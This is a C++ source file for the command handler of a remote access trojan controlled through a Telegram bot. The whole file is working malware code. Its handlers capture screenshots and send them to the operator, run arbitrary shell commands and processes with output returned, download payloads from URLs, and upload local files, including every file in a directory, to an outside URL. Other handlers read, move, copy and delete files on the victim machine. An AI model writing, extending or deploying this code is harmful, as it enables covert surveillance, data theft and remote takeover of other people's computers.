/*rat_handler/src/handlers.cpp*/

#include "rat/Handler.hpp"
#include "rat/networking.hpp"
#include "rat/system.hpp"
#include "rat/media.hpp"
#include <boost/algorithm/string.hpp>
#include <vector>
#include <sstream>
#include <fmt/core.h>
#include <fmt/chrono.h>
#include <filesystem>
#include <algorithm>
#include "logging.hpp"

namespace rat::handler {

// Helper functions
static inline void __normalizeWhiteSpaces(std::string& String_Input) {
    boost::trim(String_Input);
    boost::replace_all(String_Input, "  ", " ");
}

static inline size_t __countWhiteSpaces(const std::string& String_Input) {
    return std::count(String_Input.begin(), String_Input.end(), ' ');
}

static inline size_t __findFirstOccurenceOfChar(const std::string& Input_String, char arg_C) {
    auto pos = Input_String.find(arg_C);
    return pos != std::string::npos ? pos : Input_String.size();
}

static uint16_t _stringToUint16(const std::string& str) {
    try {
        unsigned long value = std::stoul(str);
        if (value > static_cast<unsigned long>(std::numeric_limits<uint16_t>::max())) {
            throw std::out_of_range("Value too large for uint16_t");
        }
        return static_cast<uint16_t>(value);
    }
    catch (const std::exception&) {
        throw;
    }
}
static std::vector<std::string> splitArguments(const std::string& input) {
    std::vector<std::string> args;
    std::string current;
    bool in_quotes = false;

    for (size_t i = 0; i < input.size(); ++i) {
        char c = input[i];

        if (c == '"') {
            in_quotes = !in_quotes; // toggle quote state
        } else if (c == ' ' && !in_quotes) {
            if (!current.empty()) {
                args.push_back(current);
                current.clear();
            }
        } else {
            current += c;
        }
    }

    if (!current.empty()) args.push_back(current);
    return args;
}

static std::string stripQuotes(const std::string& str) {
    std::string s = str;

    // Remove outer double or single quotes
    if (s.size() >= 2 &&
        ((s.front() == '"' && s.back() == '"') ||
         (s.front() == '\'' && s.back() == '\''))) {
        s = s.substr(1, s.size() - 2);
    }

    // Remove remaining single quotes at start/end
    if (!s.empty() && s.front() == '\'') s.erase(0, 1);
    if (!s.empty() && s.back() == '\'') s.pop_back();

    return s;
}
Command Handler::parseTelegramMessageToCommand() {
    std::string message_text = telegram_update.message.text;
    __normalizeWhiteSpaces(message_text);

    auto tokens = splitArguments(message_text);
    if (tokens.empty()) return Command("", {});

    std::string directive = stripQuotes(tokens[0]);

    std::vector<std::string> parameters;
    for (size_t i = 1; i < tokens.size(); ++i) {
        parameters.push_back(stripQuotes(tokens[i]));
    }

    return Command(std::move(directive), std::move(parameters));
}


// Command handler implementations
void Handler::handleScreenshotCommand() {
    auto image_path = std::filesystem::path(
        fmt::format("{}.jpg", rat::system::getCurrentDateTime_Underscored())
    );

    auto bot_shared = std::make_shared<tbot::Bot>(bot.getToken(), bot.getMasterId());
    // Launch screenshot asynchronously
    std::thread([bot_shared, image_path]() {
        std::string output_buffer;
        bool success = rat::media::screenshot::takeScreenshot(image_path, output_buffer);

        if(success && std::filesystem::exists(image_path)) {
            DEBUG_LOG("{} taken", image_path.string());

            if(bot_shared->sendPhoto(image_path) != rat::tbot::BotResponse::SUCCESS) {
                ERROR_LOG("Failed at uploading {}", image_path.string());
            }

            rat::system::removeFile(image_path);
        }

        if (!output_buffer.empty()) {
            bot_shared->sendMessage(output_buffer);
        }
    }).detach();

    // Immediate confirmation (optional)
    bot.sendMessage(fmt::format("Screenshot command launched."));
}

void Handler::parseAndHandleShellCommand() {
    std::string message_text = telegram_update.message.text;
    message_text.erase(0, 4); // erase "/sh "
    boost::trim(message_text);
    
    size_t space_char_pos = __findFirstOccurenceOfChar(message_text, ' ');
    std::string timeout_string = message_text.substr(0, space_char_pos);
    message_text.erase(0, space_char_pos);
    boost::trim(message_text);
    
    int timeout = 0;
    try {
        timeout = std::stoi(timeout_string);
    }
    catch (const std::exception&) {
        bot.sendMessage(fmt::format("Invalid timeout value: {}", timeout_string));
        return;
    }

    std::string result = rat::system::runShellCommand(message_text, static_cast<unsigned int>(timeout));
    bot.sendMessage(result);
}

void Handler::parseAndHandleProcessCommand() {
    std::string message_text = telegram_update.message.text;
    message_text.erase(0, 9); // remove "/process "
    boost::trim(message_text);

    // Extract timeout
    size_t space_pos = __findFirstOccurenceOfChar(message_text, ' ');
    std::string timeout_str = message_text.substr(0, space_pos);
    message_text.erase(0, space_pos);
    boost::trim(message_text);

    int timeout = 0;
    try {
        timeout = std::stoi(timeout_str);
    } catch (...) {
        this->bot.sendMessage(fmt::format("Invalid timeout value: {}", timeout_str));
        return;
    }


    auto fut = rat::system::runProcessAsync(message_text, timeout);
    this->bot.sendMessage(fmt::format("Process '{}' launched successfully.", message_text));
    auto bot_shared = std::make_shared<tbot::Bot>(this->bot.getToken(), this->bot.getMasterId());

    std::thread([bot_shared , fut = std::move(fut), cmd = message_text]() mutable {
        try {
            DEBUG_LOG("thread has being created + bot object copied {}", sizeof(tbot::Bot));
            auto res = fut.get(); // wait for process to finish

            std::string feedback;
            if (res.exit_code == -1) {
                feedback = fmt::format("Process '{}' killed (timeout exceeded).", cmd);
            } else if (res.exit_code == -2) {
                feedback = fmt::format("Process '{}' failed with exception:\n{}", cmd, res.stderr_str);
            } else {
                if(res.stderr_str.empty()) {
                    feedback = fmt::format(
                        "Process '{}' exited with code {}\n{}",
                        cmd,
                        res.exit_code,
                        res.stdout_str
                    );
                }else{
                    feedback = fmt::format(
                        "Process '{}' exited with code {}\nSTDERR:\n{}",
                        cmd,
                        res.exit_code,
                        res.stderr_str
                    );

                }
            }
            DEBUG_LOG("[{}:{} {}] {}", __FILE__, __LINE__, __func__, feedback);
            bot_shared->sendMessage(feedback);

        } catch (const std::exception& ex) {
            std::string err = fmt::format("Exception waiting for process {}", ex.what());
            ERROR_LOG(err);
            bot_shared->sendMessage(err);
        }
    }).detach();

}

void Handler::handleMenuCommand() {
    std::filesystem::path file_path(rat::system::getCurrentDateTime_Underscored());
    std::vector<std::string> tools = this->state.listDynamicTools(); // Placeholder - implement based on your Session_State
    // tools = Session_State.listDynamicTools(); // Uncomment if available
    std::sort(tools.begin(), tools.end());
    
    bool result = rat::system::echo(tools, file_path);
    if(result) {
        bot.sendFile(file_path);
        std::filesystem::remove(file_path);
    } else {
        bot.sendMessage("Failed at constructing the file and sending it");
    }
}

void Handler::handleMessageWithUploadedFiles() {
    if (telegram_update.message.files.empty()) return;

    std::ostringstream response_buffer;
    for (const auto& file : telegram_update.message.files) {
        std::filesystem::path file_path = std::filesystem::current_path();

        if (file.name.has_value() && !file.name->empty()) {
            file_path /= file.name.value();
        } else {
            file_path /= rat::system::getCurrentDateTime_Underscored();
        }
        DEBUG_LOG("We have file {} trying to download it", file_path.string());
        if(bot.downloadFile(file.id, file_path)) {
            response_buffer << "File: " << file_path.string() << " has been downloaded\n";
        } else {
            response_buffer << "File: " << file_path.string() << " has not been downloaded\n";
        }
    }

    response_buffer << fmt::format("Received {} uploaded file(s)", telegram_update.message.files.size());
    bot.sendMessage(response_buffer.str());
}

void Handler::handleDownloadCommand() {
    if (this->command.parameters.empty()) {
        bot.sendMessage("Usage: /download <url> [path]");
        return;
    }

    const auto& params = this->command.parameters;
    const size_t number_params = params.size();
    const std::string& url = params[0];

    switch (number_params) {
        case 1: {
            // simple one url
            this->curl_client.download(url);
            break;
        }
        case 2: {
            const std::filesystem::path path(params[1]);

            if (std::filesystem::exists(path) && std::filesystem::is_directory(path)) {
                const auto file_path = path / rat::networking::_getFilePathFromUrl(url);
                this->curl_client.download(url, file_path);
            } else {
                if (std::filesystem::exists(path)) {
                    bot.sendMessage(fmt::format("Warning overwriting the file {}", path.string()));
                }
                try {
                    if(this->curl_client.download(url, path) ) {
                        bot.sendMessage(fmt::format("The file was downloaded {}", path.string())); 
                    }
                } catch (const std::exception& e) {
                    const std::string error(e.what());  // safe copy
                    ERROR_LOG(error);
                    bot.sendMessage(error);
                }
            }
            break;
        }
    }
}

void Handler::handleUploadCommand() {
    if (this->command.parameters.size() < 2) {
        bot.sendMessage("Usage: /upload < <filepaths>/ * > <url>");
        return;
    }

    // Move the last element out as the URL
    std::string url = std::move(this->command.parameters.back());
    this->command.parameters.pop_back(); // remove it from parameters

    // Now move the remaining parameters into paths
    std::vector<std::string> paths = std::move(this->command.parameters);

    // Handle "*" meaning all files in current directory
    if (paths.size() == 1 && paths[0] == "*") {
        std::vector<std::filesystem::path> real_paths;

        for (const auto& entry : std::filesystem::directory_iterator(std::filesystem::current_path())) {
            if (std::filesystem::is_regular_file(entry.status())) {
                real_paths.push_back(entry.path());
            }
        }

        if (real_paths.empty()) {
            bot.sendMessage("No files found in current directory.");
            return;
        }

        for (const auto& file_path : real_paths) {
            try {
                this->curl_client.upload(file_path, url);
            } catch (const std::exception& e) {
                bot.sendMessage(fmt::format("Failed to upload {}: {}", file_path.string(), e.what()));
            }
        }
    } else {
        // Explicit list of files
        for (auto& p : paths) {
            std::filesystem::path file_path(std::move(p));

            if (!std::filesystem::exists(file_path)) {
                bot.sendMessage(fmt::format("File does not exist: {}", file_path.string()));
                continue;
            }

            if (std::filesystem::is_directory(file_path)) {
                bot.sendMessage(fmt::format("Skipping directory: {}", file_path.string()));
                continue;
            }

            try {
                this->curl_client.upload(file_path, url);
            } catch (const std::exception& e) {
                bot.sendMessage(fmt::format("Failed to upload {}: {}", file_path.string(), e.what()));
            }
        }
    }

    bot.sendMessage("Upload complete.");
}
void Handler::handlePwdCommand() {
    bot.sendMessage(rat::system::pwd());
}

void Handler::handleCdCommand() {
    if (command.parameters.empty()) {
        bot.sendMessage("No path specified");
        return;
    }
    bot.sendMessage(rat::system::cd(rat::system::normalizePath(command.parameters[0])));
}

void Handler::handleLsCommand() {
    std::string path = command.parameters.empty() ? "" : command.parameters[0];
    bot.sendMessage(rat::system::ls(rat::system::normalizePath(path)) );
}

void Handler::handleReadCommand() {
    if (command.parameters.empty()) {
        this->bot.sendMessage("No file specified");
        return;
    }
    const std::vector<std::string>& params = command.parameters;
    for(const std::string& param: params) {
        const auto& file_path = rat::system::normalizePath(param);
        const bool& file_exists = std::filesystem::exists(file_path);
        const bool& is_regular_file = std::filesystem::is_regular_file(file_path);

        if(file_exists && is_regular_file) {
            if(std::filesystem::file_size(file_path) > 4*KB ) {
                this->bot.sendMessage("File too large to be sent as a message, use /get instead");
                return;
            }
            try {
                const std::string& buffer = rat::system::readFile(file_path);
                this->bot.sendMessage(buffer);
            }catch(const std::exception& e) {
                const std::string message = fmt::format("Failed to read file{}", file_path.string());
                ERROR_LOG(message);
                this->bot.sendMessage(message); 
            }
            return;
        }else if(!is_regular_file){
            this->bot.sendMessage(fmt::format("Path: {} is not a file", file_path.string()) );
            return;
        }else if(!file_exists) {
           this->bot.sendMessage(fmt::format("Path: {} does not exist", file_path.string()));
           return;
        }
    }
}

void Handler::handleTouchCommand() {
    if (command.parameters.empty()) {
        bot.sendMessage("No file specified");
        return;
    }

    std::string response = "Failed to create";
    for (const auto& param : command.parameters) {
        bool success = rat::system::createFile(std::filesystem::path(param));
        response = fmt::format("file: {} was {}\n", param, success ? "created" : "not created");
    }
    bot.sendMessage(response);
}

void Handler::handleGetCommand() {
    if (command.parameters.empty()) {
        bot.sendMessage("No file specified");
        return;
    }

    // Strip quotes from parameter if present
    std::string file_path_str = command.parameters[0];
    if (!file_path_str.empty() && file_path_str.front() == '"' && file_path_str.back() == '"') {
        file_path_str = file_path_str.substr(1, file_path_str.size() - 2);
    }

    auto file_path = rat::system::normalizePath(file_path_str);

    if (!std::filesystem::exists(file_path)) {
        bot.sendMessage(fmt::format("File does not exist: {}", file_path.string()));
        return;
    }

    auto file_size = std::filesystem::file_size(file_path);
    DEBUG_LOG("Uploading {} of size {} bytes", file_path.string(), file_size);

    const size_t MAX_SIZE = 50 * 1024 * KB; // 50 MB limit

    if (file_size < 1.5 * 1024 * KB) { 
        // Small file: send synchronously
        bot.sendFile(file_path);
    } else if (file_size < MAX_SIZE) {
        // Medium file: send asynchronously
        auto copy_bot = std::make_shared<tbot::Bot>(bot.getToken(), bot.getMasterId());
        std::thread([copy_bot, file_path]() {
            try {
                DEBUG_LOG("Launching a thread to upload the file {}", file_path.string());
                auto resp = copy_bot->sendFile(file_path);
                if (resp != rat::tbot::BotResponse::SUCCESS) {
                    ERROR_LOG("Failed to upload {}", file_path.string());
                }
            } catch (const std::exception& ex) {
                const std::string message = fmt::format("Exception in async upload thread: {}", ex.what()); 
                ERROR_LOG(message);
                copy_bot->sendMessage(message);
            } catch (...) {
                ERROR_LOG("Unknown exception in async upload thread");
            }
          }).detach();
    } else {
        // Too big for Telegram
        bot.sendMessage("File too big for Telegram (max 50 MB)");
    }
}
void Handler::handleStatCommand() {
    if (command.parameters.empty()) {
        bot.sendMessage("No file specified");
        return;
    }

    std::filesystem::path p(command.parameters[0]);
    if (!std::filesystem::exists(p)) {
        bot.sendMessage(fmt::format("File does not exist: {}", command.parameters[0]));
        return;
    }

    std::string result = fmt::format(
        "File: {}\nSize: {} bytes\nLast modified: {}",
        p.string(),
        std::filesystem::file_size(p),
        std::filesystem::last_write_time(p).time_since_epoch().count()
    );
    bot.sendMessage(result);
}

void Handler::handleRmCommand() {
    if (command.parameters.empty()) {
        bot.sendMessage("No file specified");
        return;
    }

    std::string response;
    for (const auto& param : command.parameters) {
        const auto path = std::filesystem::path(param);
        if (!std::filesystem::exists(path)) {
            response += fmt::format("file: {} does not exist, cannot be removed\n", path.string());
            continue;
        }
        bool success = rat::system::removeFile(path);
        response += fmt::format("file: {} was {}\n", param, success ? "removed" : "not removed");
    }
    bot.sendMessage(response);
}

void Handler::handleMvCommand() {
    if (command.parameters.size() < 2) {
        bot.sendMessage("Usage: /mv <src> <dest>");
        return;
    }

    const auto source_path = std::filesystem::path(command.parameters[0]);
    const auto dist_path = std::filesystem::path(command.parameters[1]);

    if (!std::filesystem::exists(source_path)) {
        bot.sendMessage(fmt::format("Source path {} does not exist", source_path.string()));
        return;
    }

    std::string result;
    if (rat::system::isFile(source_path)) {
        if (rat::system::isDir(dist_path)) {
            if (rat::system::renameFile(source_path, dist_path / source_path.filename())) {
                result = fmt::format("File {} moved to {}", source_path.string(), (dist_path / source_path.filename()).string());
            } else {
                result = fmt::format("Failed to move file {}", source_path.string());
            }
        } else {
            if (rat::system::renameFile(source_path, dist_path)) {
                result = fmt::format("File {} renamed to {}", source_path.string(), dist_path.string());
            } else {
                result = fmt::format("Failed to rename file {}", source_path.string());
            }
        }
    } else {
        if (rat::system::moveDir(source_path, dist_path)) {
            result = fmt::format("Directory {} moved to {}", source_path.string(), dist_path.string());
        } else {
            result = fmt::format("Failed to move directory {}", source_path.string());
        }
    }
    bot.sendMessage(result);
}

void Handler::handleCpCommand() {
    if (command.parameters.size() < 2) {
        bot.sendMessage("Usage: /cp <src> <dest>");
        return;
    }

    const auto source_path = std::filesystem::path(command.parameters[0]);
    const auto dist_path = std::filesystem::path(command.parameters[1]);

    if (!std::filesystem::exists(source_path)) {
        bot.sendMessage(fmt::format("Path: {} does not exist", source_path.string()));
        return;
    }

    if (std::filesystem::exists(dist_path)) {
        bot.sendMessage(fmt::format("Path {} already exists, overwrite disabled", dist_path.string()));
        return;
    }

    bool result = false;
    if (rat::system::isFile(source_path)) {
        if (rat::system::isFile(dist_path)) {
            result = rat::system::copyFile(source_path, dist_path);
        } else {
            result = rat::system::copyFile(source_path, dist_path / source_path.filename());
        }
    } else {
        result = rat::system::copyDir(source_path, dist_path);
    }

    if (result) {
        bot.sendMessage(fmt::format("Content of {} copied to {}", source_path.string(), dist_path.string()));
    } else {
        bot.sendMessage(fmt::format("Failed to copy {} to {}", source_path.string(), dist_path.string()));
    }
}

void Handler::handleSetCommand() {
    if (command.parameters.empty()) {
        bot.sendMessage("/set <variable> <value>");
        return;
    }

    const std::string& variable = command.parameters[0];
    if (variable == "update_interval") {
        if (command.parameters.size() < 2) {
            bot.sendMessage("Missing value for update_interval");
            return;
        }

        try {
            uint16_t update_interval = _stringToUint16(command.parameters[1]);
            bot.setUpdateIterval(update_interval);
            bot.sendMessage(fmt::format("Bot's update_interval == {}", update_interval));
        }
        catch (const std::exception& e) {
            bot.sendMessage(fmt::format("Error setting update_interval: {}", e.what()));
        }
    } else {
        bot.sendMessage(fmt::format("Unknown variable: {}", variable));
    }
}

} // namespace rat::handler
